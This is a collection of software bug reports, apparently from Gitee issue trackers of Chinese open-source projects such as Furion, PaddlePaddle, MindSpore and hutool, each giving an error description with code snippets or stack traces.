InsertOrUpdateNowAsync方法报错,"如题方法报错， Database operation expected to affect 1 row(s) but actually affected 0 row(s). Data may have been modified or deleted since entities were loaded. https://gitee.com/dotnetchina/Furion/issues/I3QKO5#note_5071259 [Parameters=[@p8='0', @p0='0', @p1='0.0.0.1' (Size = 4000), @p2='False', @p3='0x9920D6F6DF8B6883ABE2B4F827DCA946CFFE20D9' (Size = 8000), @p4='22222', @p5='159633753866309', @p6='2021-05-16T21:44:19.0911143+08:00' (Nullable = true), @p7='0'], CommandType='Text', CommandTimeout='30'] SET NOCOUNT ON; UPDATE [tracker_peer] SET [DownLoaded] = @p0, [Ip] = @p1, [IsDeleted] = @p2, [PeerId] = @p3, [Port] = @p4, [TorrentId] = @p5, [UpdatedTime] = @p6, [Uploaded] = @peter5678 WHERE [Id] = @p8;   <code>: await _peerService.InsertOrUpdateNowAsync(new Peer { TenantId = 1, TorrentId = torrent.Id, PeerId = HttpUtility.UrlDecodeToBytes(output.InfoHashByte), DownLoaded = output.Downloaded, Uploaded = output.Uploaded, Ip = output.Ip, Port = output.Port });"
exception occurs when do BERT training on CPU with transpose mkldnn op enabled,"I met a issue related with mkldnn when I tried to enable transpose mkldnn op in ParallelExecutor for BERT training. throw exception in TransposeMKLDNNHandler:: AcquireTranspose() For current implementation in Compute(), a hash key is used for create TransposeMKLDNNHandler, and this key is generated by This method is ok for common case in Executor or NativeExecutor since the only instance for one op, and even for multi-instances inference case, SetMkldnnThreadID() is designed for identifying op. But for ParallelExecutor case, it is specific, it duplicates program execution by user defined instance number, it looks like you have multiple GPU cards in one machine. Let's come to the root cause for my case, for ParallelExecutor on CPU, no place to SetMkldnnThreadID() to identify different mkldnn op instances on same program, simply speaking, the key generation method is not enough anymore. For my current temporary solution, I add kernel instance pointer 'this' into hash key, so it can be simplified with just 'this', and then it works. I think it is not a issue just on Transpose, it may be a generic issue for all mkldnn ops on ParallelExecutor.   <code>: PADDLE_ENFORCE((transpose_p != nullptr) || (is_reusing_ == false), ""Fail to find convolution primitive in device context""); const std::string key = platform::TransposeMKLDNNHandler::GetHash( nchw_tz, axis, ctx.op().Output(framework::GradVarName(""X"")));"
A potential overflow problem in `Dim`,"In the current code, elements of are (32 bit) values. This design is directly ported from Majel. However, returns a (64 bit) value. It's necessary because the product result of a huge tensor's dimensions can be extremly large (e.g. in word embedding). When we flatten a tensor to a vector, we are trying to assign a value to an value. It may cause overflow.   <code>: DDim int product() ssize_t ssize_t int"
http://127.0.0.1:8360/admin/type/topic页面报错,can't find template file   <code>: /Users/changsichong/Desktop/workspace/nodespace/wj/view/admin/type_topic.html
"Error when reading MindRecord with Win CPU version of MindSpore, other versions don't have this problem.","Error when reading MindRecord with Win CPU version of MindSpore, other versions don't have this problem. / 硬件环境: /device cpu : -- MindSpore version : r1.5.2 / r1.3.0 -- Python version : 3.7.5 -- OS platform and distribution : Windows ]\   <code>: import mindspore.dataset as ds if __name__ == '__main__': source_data = ds.MindDataset(dataset_file='../data/mindrecord/voc_val_sar5.mindrecord', ) for data in source_data.create_dict_iterator(output_numpy=True): print(type(data)) break"
Select使用OnSearchTextChanged时，存在显示空白bug,"razor文件 点击选项，呈空白状态，效果如下： Web Assembly   <code>: &lt;Select @bind-Value=""Model.VoyageId"" OnSearchTextChanged=""OnSearch"" ShowSearch=""true""/&gt; @code { IEnumerable&lt;SelectedItem&gt; OnSearch(string key) { var a = new List&lt;SelectedItem&gt;(); a.Add(new SelectedItem { Text = key, Value = Guid.NewGuid().ToString() }); a.Add(new SelectedItem { Text = key + ""1"", Value = Guid.NewGuid().ToString() }); return a; } }"
本地使用表达式=case判断值是否为空会报错,"版本号： 本地使用表达式 判断值是否为空会报错 =case('${test2.children}'!=,'有','无')会报错 积木报表是一款免费报表产品，功能免费源码不开放;   <code>: &lt;dependency&gt; &lt;groupId&gt;org.jeecgframework.jimureport&lt;/groupId&gt; &lt;artifactId&gt;jimureport-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;1.4.2&lt;/version&gt; &lt;/dependency&gt;"
[CT][MS][UnsortedSegmentProd] The dynamic shape testcase of UnsortedSegmentProd has error.,"The dynamic shape testcase of UnsortedSegmentProd has error The dynamic shape testcase of UnsortedSegmentProd has error / 硬件环境: /device ascend/GPU/CPU :: -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph   <code>: ____________________________________________ test_dynamic_shape_unsortedsegmentprod_input_2x2x32x2x12_segments_1x0_numseg_2 ____________________________________________ def test_dynamic_shape_unsortedsegmentprod_input_2x2x32x2x12_segments_1x0_numseg_2(): input_x_np = np.random.randn(2, 2, 32, 2, 12).astype(np.float32) segment_ids=np.array([1, 0]).astype(np.int32) num_segments = 2 indices_np = np.array([i for i in range(0, 2)]).astype(np.int32) fact = UnsortedSegmentProdDynamicShapeFactory(input_x_np, segment_ids, num_segments, indices_np) &gt; fact.forward_cmp() test_dynamic_shape_unsortedsegmentprod.py:148: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ test_dynamic_shape_unsortedsegmentprod.py:57: in forward_cmp out_ms = self.forward_mindspore_impl() test_dynamic_shape_unsortedsegmentprod.py:41: in forward_mindspore_impl out_ms = ms_net(Tensor(self.input_x_np), Tensor(self.segment_ids), self.num_segments, Tensor(self.indices_np)) /root/archiconda3/envs/zhujunan2/lib/python3.7/site-packages/mindspore/nn/cell.py:574: in __call__ out = self.compile_and_run(*args) /root/archiconda3/envs/zhujunan2/lib/python3.7/site-packages/mindspore/nn/cell.py:957: in compile_and_run self.compile(*inputs) /root/archiconda3/envs/zhujunan2/lib/python3.7/site-packages/mindspore/nn/cell.py:930: in compile jit_config_dict=self._jit_config_dict) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ self = &lt;mindspore.common.api._CellGraphExecutor object at 0xffff712a7a50&gt;, obj = UnsortedSegmentProdDynamicShapeNetMS&lt;&gt; phase = 'train.1657957805214890240.281468601912880.5', do_convert = True, auto_parallel_mode = False, jit_config_dict = {} def compile(self, obj, *args, phase='predict', do_convert=True, auto_parallel_mode=False, jit_config_dict=None): """""" Compiles graph. Args: obj (Function/Cell): The function or cell instance need compile. args (tuple): Function or cell input arguments. phase (str): The name of compile phase. Default: 'predict'. do_convert (bool): When set to True, convert ME graph to GE graph after compiling graph. auto_parallel_mode: When set to True, use auto parallel mode to compile graph. jit_config_dict (dict): Jit config for compile. Default: None. Return: Str, the full phase of the cell. Bool, if the graph has been compiled before, return False, else return True. """""" obj.__parse_method__ = 'construct' if not hasattr(obj, obj.__parse_method__): raise AttributeError( 'The class {} dose not have method {}'.format(obj.__class__.__name__, obj.__parse_method__)) args_list = args if hasattr(obj, ""enable_tuple_broaden""): self.enable_tuple_broaden = obj.enable_tuple_broaden self._graph_executor.set_enable_tuple_broaden(self.enable_tuple_broaden) key = self._graph_executor.generate_arguments_key(args_list, self.enable_tuple_broaden) obj.arguments_key = str(key) phase = phase + '.' + str(obj.create_time) + '.' + str(id(obj)) + '.' + obj.arguments_key if phase in obj.compile_cache and self.has_compiled(phase): logger.debug(""%r graph has existed."", phase) return phase, False obj.check_names() _check_full_batch() self._set_dataset_mode(args_list) self._set_compile_cache_dep_files(phase) is_sink_mode = args and isinstance(args[0], Tensor) and args[0].virtual_flag if auto_parallel_mode and _need_to_full() and not is_sink_mode and obj.auto_parallel_compile_and_run(): args_list = _to_full_tensor(args, _get_device_num(), _get_global_rank()) enable_ge = context.get_context(""enable_ge"") self._graph_executor.set_weights_values(obj.parameters_dict()) if jit_config_dict: self._graph_executor.set_jit_config(jit_config_dict) &gt; result = self._graph_executor.compile(obj, args_list, phase, self._use_vm_mode()) E RuntimeError: Single op compile failed, op: unsorted_segment_prod_147249108767039382_2 E except_msg: 2022-07-16 15:50:05.280749: Query except_msg:Traceback (most recent call last): E File ""/root/archiconda3/envs/zhujunan2/lib/python3.7/site-packages/te_fusion/parallel_compilation.py"", line 1470, in run E relation_param=self._relation_param) E File ""/root/archiconda3/envs/zhujunan2/lib/python3.7/site-packages/te_fusion/fusion_manager.py"", line 1283, in build_single_op E compile_info = call_op() E File ""/root/archiconda3/envs/zhujunan2/lib/python3.7/site-packages/te_fusion/fusion_manager.py"", line 1220, in call_op E opfunc(*inputs, *outputs, *new_attrs, **kwargs) E File ""/root/archiconda3/envs/zhujunan2/lib/python3.7/site-packages/tbe/common/register/operation_func_mgr.py"", line 97, in wrapper E return func(*args, **kwargs) E File ""/root/archiconda3/envs/zhujunan2/lib/python3.7/site-packages/tbe/common/utils/para_check.py"", line 547, in _in_wrapper E return func(*args, **kwargs) E File ""/usr/local/Ascend/latest/opp/op_impl/built-in/ai_core/tbe/impl/dynamic/unsorted_segment_prod.py"", line 73, in unsorted_segment_prod E x_dict, segment_ids_dict, num_segments_dict, y_dict, kernel_name, instruction='segment_prod') E File ""/usr/local/Ascend/latest/opp/op_impl/built-in/ai_core/tbe/impl/dynamic/unsorted_segment.py"", line 1429, in unsorted_segment E error_manager_vector.raise_err_specific_reson(kernel_name, ""range of segment_ids_dict cannot fit x_dict!"") E File ""/root/archiconda3/envs/zhujunan2/lib/python3.7/site-packages/tbe/common/utils/errormgr/error_manager_vector.py"", line 284, in raise_err_specific_reson E raise RuntimeError(args_dict, msg) E RuntimeError: ({'errCode': 'E61001', 'op_name': 'unsorted_segment_prod_147249108767039382_2', 'reason': 'range of segment_ids_dict cannot fit x_dict!'}, 'In op [unsorted_segment_prod_147249108767039382_2], [range of segment_ids_dict cannot fit x_dict!]') E E E The function call stack: E In file /home/zhujunan/temp/testcase/dynamic_shape_operations/OpsTester/OpsTester/dynamic_shape_operations/test_dynamic_shape_unsortedsegmentprod.py(25)/ return self.unsorted_segment_prod(x, segment_ids, num_segments)/ E E ---------------------------------------------------- E - C++ Call Stack: (For framework developers) E ---------------------------------------------------- E mindspore/ccsrc/plugin/device/ascend/kernel/tbe/tbe_kernel_compile.cc:472 QueryProcess"
AttributeError: module 'paddle.fluid.layers' has no attribute 'dynamic_decoder',"paddle1.7.0,python3.7,我在另一个notebook里用是ok的，但在这个notebook里用就不行？？茫然   <code>: Traceback (most recent call last): File ""./work/seq2seq.py"", line 393, in &lt;module&gt; train(opt) File ""./work/seq2seq.py"", line 322, in train predict(opt, opt.model_save_dir) File ""./work/seq2seq.py"", line 352, in predict predict_seqs = model_func(opt,inputs, is_train=False) File ""./work/seq2seq.py"", line 227, in model_func is_train=is_train) File ""./work/seq2seq.py"", line 185, in decoder decoder_output,_=layers.dynamic_decoder( AttributeError: module 'paddle.fluid.layers' has no attribute 'dynamic_decoder'"
 build release version of release/0.11.0 failed on Mac,The cmake config is: The log is following:   <code>: cmake .. -DCMAKE_BUILD_TYPE=Release -DWITH_GOLANG=OFF -DPYTHON_EXECUTABLE=/usr/local/bin/python2.7 -DPYTHON_LIBRARY=/usr/local/Cellar/python/2.7.14/Frameworks/Python.framework/Versions/2.7/lib/libpython2.7.dylib [ 15%] Built target paddle_proto paddle/framework/CMakeFiles/framework_py_proto.dir/build.make:60: *** target pattern contains no `%'. Stop. make[1]: *** [paddle/framework/CMakeFiles/framework_py_proto.dir/all] Error 2 make[1]: *** Waiting for unfinished jobs.... [ 15%] Linking CXX static library libddim.a cpplint: Checking source code style [ 15%] Linking CXX static library libframework_proto.a
封装 HttpServletRequet 与 HttpServletResponse,考虑在 Action 方法中使用已封装的 与 对象，向开发者提供一些常用的方法，需要对 进行封装。   <code>: HttpServletRequet HttpServletResponse DataContext
SQLManager 增加函数 识别不了表,"为了能够实现多租户，采用每个租户一张表的方式，改造SQLManager，如下 我的实体类； 在执行的时候提示如下： 但是就是实体类的表名就是识别不了，是哪里有问题？   <code>: @Configuration public class BeeConfig { @Bean public SQLManagerCustomize sqlManagerCustomize() { return (sqlManagerName, manager) -&gt; { // 设置 sql 拦截器 //manager.setInters(new Interceptor[]{new Slf4JLogInterceptor()}); log.error(""我要进行配置""); // 申明一个虚表 ""${toTable('user',id)}""，实际上是user表 manager.addVirtualTable(""sys_user"",sys_user); BeetlTemplateEngine templateEngine = (BeetlTemplateEngine)manager.getSqlTemplateEngine(); // 注册一个方法来实现映射到多表的逻辑 templateEngine.getBeetl().getGroupTemplate().registerFunction(""toTable"", new Function(){ @Override public Object call(Object[] paras, Context ctx) { String tableName = (String)paras[0]; String tenantId = TenantRequestContext.getTenantLocal(); if(StringUtils.isNotEmpty(tenantId)){ return tableName+""_""+tenantId; }else { return tableName; } } }); }; } } [dispatcherServlet] in context with path [] threw exception [Request processing failed; nested exception is org.beetl.sql.clazz.kit.BeetlSQLException: table ""${toTable('sys_user')}"" not exist] with root cause org.beetl.sql.clazz.kit.BeetlSQLException: table ""${toTable('sys_user')}"" not exist at org.beetl.sql.core.meta.SchemaMetadataManager.getTable(SchemaMetadataManager.java:100) at org.beetl.sql.core.query.QueryCondition.getTableName(QueryCondition.java:72) at org.beetl.sql.core.query.Query.assembleSelectSql(Query.java:157) at org.beetl.sql.core.query.Query.pageByType(Query.java:342) at org.beetl.sql.core.query.Query.page(Query.java:357) at com.lausun.cloud.service.system.service.impl.UserServiceImpl.getListPage(UserServiceImpl.java:96) at com.lausun.cloud.service.system.service.impl.UserServiceImpl.getList(UserServiceImpl.java:212)"
 [调整] 底层移除 `Mapster` 第三方库,由于很多朋友使用 ，所以底层如果集成了 ，那么就会导致多个映射组件共存情况。   <code>: AutoMapper Mapster
Parameter server design doc,"无论是否重写parameter server，我们都需要一个清晰的parameter server接口： 如果不重写，可以保证修改现有代码不会让可维护性降得更低。以后要重写只用保持接口不变，更换实现即可。 如果重写，也需要一个清晰的接口，保证代码质量。 目前parameter server只需要支持：异步SGD，不带动量的优化算法（传统SGD），dense更新。 不需要支持：同步SGD，各种带动量的优化算法，sparse更新。 接口需要涵盖目前不需要支持的功能，不需要实现不支持的功能。 据我理解，design doc需要以下几块接口的定义： 运行parameter server的命令行参数是什么： 比如： RPC Server接口伪代码： 我想象的，举个例子： RPC client API，python and C/C++ 出于性能考虑update和download貌似只能是C/C++ API (不然数据类型需要经过python中转）。 C/C++ API（C或者C++都行，只要表达了意思就好）。如果要用golang重写，实现的时候需要C API： 我想象的，举个例子： python API（是否只需要保存模型的API？） 把parameter server 主干部分（参数存储，更新部分，除去RPC以及使用etcd做service announcement的部分）当作一个库，库的API。 定义库API可以把RPC代码与主干部分清晰分开。以后保持接口，更换实现会很方便。另外有可能用golang写主程序，编译时候链接这个库。   <code>: --port 8000 --save-period 60 int update(string method, list of dense gradients); int download(pointer to list of dense gradients); int updateSparse(string method, xxx); int downloadSparse(xxx); int saveModel(string path); int update(string method, list of dense gradients); int download(pointer to list of dense gradients); int updateSparse(string method, xxx); int downloadSparse(xxx); int saveModel(string path); int wait(int t); // e.g., // update(...); // int errorCode = wait(download(...));"
Base64.encode(XML.toXml(hisXml))异常,JDK版本： openjdk_8_201 hutool版本： 5.8.0.M1 还原到5.7.22版本后正常   <code>: Base64.encode(XML.toXml(hisXml))
LookupOp: default value of unknown_token support NoneType,"Task Use this template for task tracking kind/task Task Description What type of PR is this? /kind task What does this PR do / why do we need it: LookupOp: default value of unknown_token support NoneType. Our Vocab class can support string("""") (empty string) in vocab table, but LookupOp will skip looking up unknown_token when we pass string("""") to it. However, LookupOp have to cover a condition of no specifying unknown_token and not to look up it (equal to unknown_token=None), it is obviously string("""") can not represent NoneType. Thus, I let unknown_token become type to conver 3 conditions: unknown_token = std::string xxx, LookuoOp can look up unknown_token in vocab unknown_token = std::string(""""), LookuoOp can look up unknown_token in vocab unknown_token = std::nullopt, LookuoOp can skip looking up unknown_token in vocab Task Goal   <code>: /kind &lt;&gt; std::optional&lt;std::string&gt;"
ExcelReader的readAll方法获取值为null,"JDK版本： openjdk_8_333 hutool版本： 5.8.7 用户模型   <code>: ExcelReader excelReader = ExcelUtil.getReader(""用户信息.xlsx""); excelReader.addHeaderAlias(""username"", ""用户名""); excelReader.addHeaderAlias(""password"", ""密码""); excelReader.addHeaderAlias(""sexCn"", ""性别""); List&lt;UserInfo&gt; userInfos = excelReader.readAll(UserInfo.class); userInfos.forEach(item-&gt; System.out.println(item.toString())); excelReader.close(); public class UserInfo { private String username; private String password; private Integer sex; private String sexCn; //geter,setter... }"
[ST][MS][Comiler]报错解决地图190560中能给出具体解决方法,https://bbs.huaweicloud.com/forum/forum.php?mod=viewthread&amp;tid=190560 原因分析与解决方法中，并没有体现出具体解决方法 / 硬件环境: /device ascend等其他芯片 : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph test_usability_specifications_website_tutorial_accurate_001 浏览器 https://bbs.huaweicloud.com/forum/forum.php?mod=viewthread&amp;tid=190560 能给出具体解决方法 责任人 廉立光   <code>: 2 原因分析以及解决办法 这个是因为MindSpore 编译器在编译结束后进行校验时，发现了函数内部仍然还有一些解释类型的节点，导致的报错。
inputs()该怎么用，什么时候用,我发现很多网络配置里面没有用到inputs() 我的网络配置里面没用inputs()，出现如下错误 加上inputs()后，问题解决了。 请问inputs()该怎么用，什么时候用   <code>: F1124 02:01:51.846015 8632 NeuralNetwork.cpp:232] Check failed: inArgs.size() == dataLayers_.size() (3 vs. 2)
遍历查询时报错（can not find lambda cache for this property xxx of entity）,"当前使用版本 3.5.1 在遍历查询时出现   <code>: List&lt;Administrator&gt; finalAdministratorList = administratorList; administratorList.forEach(administrator -&gt; { boolean contains = map.containsKey(administrator.getName()); if (contains) { // 如果重复则删除数据库字段 // 超级管理员跳过删除 log.info(""name.....................{}"",administrator.getName()); administratorLambdaQueryWrapper.eq(Administrator::getSuperAdmin,1) .eq(Administrator::getName, administrator.getName()); Long count = administratorMapper.selectCount(administratorLambdaQueryWrapper);//报错行 if (count &gt; 0) { finalAdministratorList.remove(administrator); stringBuilder.append(""username="").append(administrator.getName()).append(""为超级管理员，无法删除"").append(""\n""); }else { administratorMapper.deleteById(map.get(administrator.getName())); stringBuilder.append(""username="").append(administrator.getName()).append(""\n""); } } }); com.baomidou.mybatisplus.core.exceptions.MybatisPlusException: can not find lambda cache for this property [superAdmin] of entity [com.zyy.writesystem.entity.Administrator] at com.baomidou.mybatisplus.core.toolkit.ExceptionUtils.mpe(ExceptionUtils.java:49) ~[mybatis-plus-core-3.5.1.jar:3.5.1] at com.baomidou.mybatisplus.core.toolkit.Assert.isTrue(Assert.java:38) ~[mybatis-plus-core-3.5.1.jar:3.5.1] at com.baomidou.mybatisplus.core.toolkit.Assert.notNull(Assert.java:72) ~[mybatis-plus-core-3.5.1.jar:3.5.1] at com.baomidou.mybatisplus.core.conditions.AbstractLambdaWrapper.getColumnCache(AbstractLambdaWrapper.java:101) ~[mybatis-plus-core-3.5.1.jar:3.5.1] at com.baomidou.mybatisplus.core.conditions.AbstractLambdaWrapper.getColumnCache(AbstractLambdaWrapper.java:84) ~[mybatis-plus-core-3.5.1.jar:3.5.1] at com.baomidou.mybatisplus.core.conditions.AbstractLambdaWrapper.columnToString(AbstractLambdaWrapper.java:67) ~[mybatis-plus-core-3.5.1.jar:3.5.1] at com.baomidou.mybatisplus.core.conditions.AbstractLambdaWrapper.columnToString(AbstractLambdaWrapper.java:63) ~[mybatis-plus-core-3.5.1.jar:3.5.1] at com.baomidou.mybatisplus.core.conditions.AbstractLambdaWrapper.columnToString(AbstractLambdaWrapper.java:39) ~[mybatis-plus-core-3.5.1.jar:3.5.1] at com.baomidou.mybatisplus.core.conditions.AbstractWrapper.lambda$columnToSqlSegment$a3f115af$1(AbstractWrapper.java:637) ~[mybatis-plus-core-3.5.1.jar:3.5.1] at java.util.stream.ReferencePipeline$3$1.accept(ReferencePipeline.java:193) ~[na:1.8.0_311]"
[CT][MS][Cauchy]Valid msg need to optimize,"校验信息有待优化 / 硬件环境: /device ascend/CPU : -- MindSpore version :众智whl包 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph 执行测试用例 报错信息规范， 且有指导作用 For xx， yy should ..., but ...   <code>: def test_cauchy_size_data_0(): size = [0, 2] fact = CauchyMock(attributes={'size': size}) #with pytest.raises(ValueError) as err: &gt; fact.forward_mindspore_impl() def test_cauchy_size_data_0(): size = [0, 2] fact = CauchyMock(attributes={'size': size}) #with pytest.raises(ValueError) as err: &gt; fact.forward_mindspore_impl() E ValueError: Cauchy size [ 0] must &gt; 0."
docker环境下paddledev/paddle:gpu-demo-v0.9.0a0 ，执行quickstart，Cuda Error: CUDA driver version is insufficient for CUDA runtime version,"概述： docker环境下paddledev/paddle:gpu-demo-v0.9.0a0 ，执行quickstart，Cuda Error: CUDA driver version is insufficient for CUDA runtime version。 I1129 11:18:51.543231 335 Util.cpp:155] commandline: /usr/local/bin/../opt/paddle/bin/paddle_trainer --config=trainer_config.lr.py --save_dir=./output --trainer_count=4 --log_period=100 --num_passes=15 --use_gpu=True F1129 11:18:51.543578 335 hl_cuda_device.cc:526] Check failed: cudaSuccess == cudaStat (0 vs. 35) Cuda Error: CUDA driver version is insufficient for CUDA runtime version *** Check failure stack trace: *** @ 0x7f6d59f61daa (unknown) @ 0x7f6d59f61ce4 (unknown) @ 0x7f6d59f616e6 (unknown) @ 0x7f6d59f64687 (unknown) @ 0x895bf0 hl_specify_devices_start() @ 0x895dfd hl_start() @ 0x813362 paddle::initMain() @ 0x52ac5b main @ 0x7f6d5916df45 (unknown) @ 0x540c05 (unknown) @ (nil) (unknown) /usr/local/bin/paddle: line 109: 335 Aborted ${DEBUGGER} $MYDIR/../opt/paddle/bin/paddle_trainer ${@:2} I1129 11:18:52.197794 356 Util.cpp:155] commandline: /usr/local/bin/../opt/paddle/bin/paddle_trainer --config=trainer_config.lr.py --use_gpu=false --job=test --init_model_path=output/pass-00003 --config_args=is_predict=1 --predict_output_dir=. I1129 11:18:52.197998 356 Util.cpp:130] Calling runInitFunctions I1129 11:18:52.198359 356 Util.cpp:143] Call runInitFunctions done. [WARNING 2016-11-29 11:18:52,343 networks.py:1438] routine try to calculate network's inputs and outputs order. It might not work well.Please see follow log carefully. [INFO 2016-11-29 11:18:52,343 networks.py:1466] The input order is [word] [INFO 2016-11-29 11:18:52,343 networks.py:1472] The output order is [maxid_layer_0, fc_layer_0] I1129 11:18:52.350263 356 Trainer.cpp:149] trainer: in testing mode I1129 11:18:52.350291 356 Trainer.cpp:156] trainer mode: Testing I1129 11:18:52.451740 356 PyDataProvider2.cpp:257] loading dataprovider dataprovider_bow::process_predict I1129 11:18:52.453099 356 GradientMachine.cpp:123] Loading parameters from output/pass-00003 I1129 11:18:52.453135 356 Parameter.cpp:344] missing parameters [output/pass-00003/_fc_layer_0.w0] while loading model. F1129 11:18:52.453147 356 Parameter.cpp:350] _fc_layer_0.w0 missing, not allowed. *** Check failure stack trace: *** @ 0x7efc8abdedaa (unknown) @ 0x7efc8abdece4 (unknown) @ 0x7efc8abde6e6 (unknown) @ 0x7efc8abe1687 (unknown) @ 0x825ce2 paddle::Parameter::load() @ 0x5633a6 paddle::GradientMachine::loadParameters() @ 0x6b689c paddle::ParameterUtil::loadParametersWithPath() @ 0x6c0a6d paddle::Tester::test() @ 0x52b718 main @ 0x7efc89deaf45 (unknown) @ 0x540c05 (unknown) @ (nil) (unknown) /usr/local/bin/paddle: line 109: 356 Aborted ${DEBUGGER} $MYDIR/../opt/paddle/bin/paddle_trainer ${@:2}   <code>: outputs"
[CT][MA]The description in the official document is incorrect.,": /device ascend : -- MindSpore version :binary -- Python version :Python 3.7.5 -- OS platform and distribution :Linux Ubuntu 16.04 -- GCC/Compiler version : na pytest -s test_mindarmour_attacks.py::test_mindarmour_attacks_basiciterativemethod_batch 官方文档应与实际代码调用相符   <code>: def check_numpy_param(arg_name, arg_value): """""" None-check and Numpy-check for `value` . Args: arg_name (str): Name of parameter. arg_value (Union[list, tuple, numpy.ndarray]): Value for check. Returns: numpy.ndarray, if `value` is not empty, return `value` with type of numpy.ndarray. Raises: ValueError: If value is empty. ValueError: If value type is not in (list, tuple, numpy.ndarray). """""" _ = _check_array_not_empty(arg_name, arg_value) if isinstance(arg_value, (list, tuple)): arg_value = np.asarray(arg_value) elif isinstance(arg_value, np.ndarray): arg_value = np.copy(arg_value) else: msg = 'type of {} must be in (list, tuple, numpy.ndarray)'.format( arg_name) LOGGER.error(TAG, msg) raise TypeError(msg)"
开启easy connection后同一内网地址浏览器可以正常访问，远程请求则无法访问,"Furion 版本号 Furion V2.7.2 Web 项目类型 WebApi Mvc Razor Pages Blazor Server 在开启easy connection后，同一内网地址通过浏览器访问正常,远程请求无法访问。 由于连接方在一段时间后没有正确答复或连接的主机没有反应，连接尝试失败。 at System.Net.Http.ConnectHelper.d__1.MoveNext() at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw() at System.Runtime.CompilerServices.TaskAwaiter.ThrowForNonSuccess(Task task) at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task) at System.Threading.Tasks.ValueTask1.ConfiguredValueTaskAwaiter.GetResult() at System.Net.Http.HttpConnectionPool.d__82.MoveNext() at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw() at System.Runtime.CompilerServices.TaskAwaiter.ThrowForNonSuccess(Task task) at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task) at System.Runtime.CompilerServices.TaskAwaiter.ValidateEnd(Task task) at System.Threading.Tasks.ValueTask1.ConfiguredValueTaskAwaiter.GetResult() at System.Net.Http.HttpConnectionPool.d__86.MoveNext() at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw() at System.Runtime.CompilerServices.TaskAwaiter.ThrowForNonSuccess(Task task) at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task) at System.Runtime.CompilerServices.TaskAwaiter.ValidateEnd(Task task) at System.Threading.Tasks.ValueTask1.ConfiguredValueTaskAwaiter.GetResult() at System.Net.Http.HttpConnectionPool.d__67.MoveNext() at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw() at System.Runtime.CompilerServices.TaskAwaiter.ThrowForNonSuccess(Task task) at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task) at System.Runtime.CompilerServices.TaskAwaiter.ValidateEnd(Task task) at System.Threading.Tasks.ValueTask1.ConfiguredValueTaskAwaiter.GetResult() at System.Net.Http.HttpConnectionPool.d__72.MoveNext() at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw() at System.Runtime.CompilerServices.TaskAwaiter.ThrowForNonSuccess(Task task) at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task) at System.Threading.Tasks.ValueTask1.ConfiguredValueTaskAwaiter.GetResult() at System.Net.Http.RedirectHandler.d__4.MoveNext() at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw() at System.Runtime.CompilerServices.TaskAwaiter.ThrowForNonSuccess(Task task) at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task) at System.Runtime.CompilerServices.ConfiguredTaskAwaitable1.ConfiguredTaskAwaiter.GetResult() at Microsoft.Extensions.Http.Logging.LoggingHttpMessageHandler.d__5.MoveNext() at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw() at System.Runtime.CompilerServices.TaskAwaiter.ThrowForNonSuccess(Task task) at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task) at System.Runtime.CompilerServices.ConfiguredTaskAwaitable1.ConfiguredTaskAwaiter.GetResult() at System.Net.Http.HttpClient.d__85.MoveNext() at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw() at System.Runtime.CompilerServices.TaskAwaiter.ThrowForNonSuccess(Task task) at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task) at Furion.RemoteRequest.HttpClientExecutePart.d__96.MoveNext() at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw() at System.Runtime.CompilerServices.TaskAwaiter.ThrowForNonSuccess(Task task) at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task) at System.Runtime.CompilerServices.TaskAwaiter1.GetResult() at TmcDevFrame.Application.SystemAppService.GetValidateData() in E:\Work\01Work\01Code\ZYPH2021Net5\TmcDevFrame.Application\SystemAppService.cs:line 40 at Microsoft.AspNetCore.Mvc.Infrastructure.ActionMethodExecutor.SyncObjectResultExecutor.Execute(IActionResultTypeMapper mapper, ObjectMethodExecutor executor, Object controller, Object[] arguments) at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.&lt;g__Logged|12_1&gt;d.MoveNext() 代码或代码仓库 await ""http://xxx.xxx.xxx.xxx:8015/service/Auth.ashx?callback=?&amp;action=Authentication"".GetAsStringAsync(); Sqlite SqlServer Mysql Oracle PGSql Firebird Cosmos   <code>: 1.get_Result() at System.Runtime.CompilerServices.ConfiguredValueTaskAwaitable 1.get_Result() at System.Runtime.CompilerServices.ConfiguredValueTaskAwaitable 1.get_Result() at System.Runtime.CompilerServices.ConfiguredValueTaskAwaitable 1.get_Result() at System.Runtime.CompilerServices.ConfiguredValueTaskAwaitable 1.get_Result() at 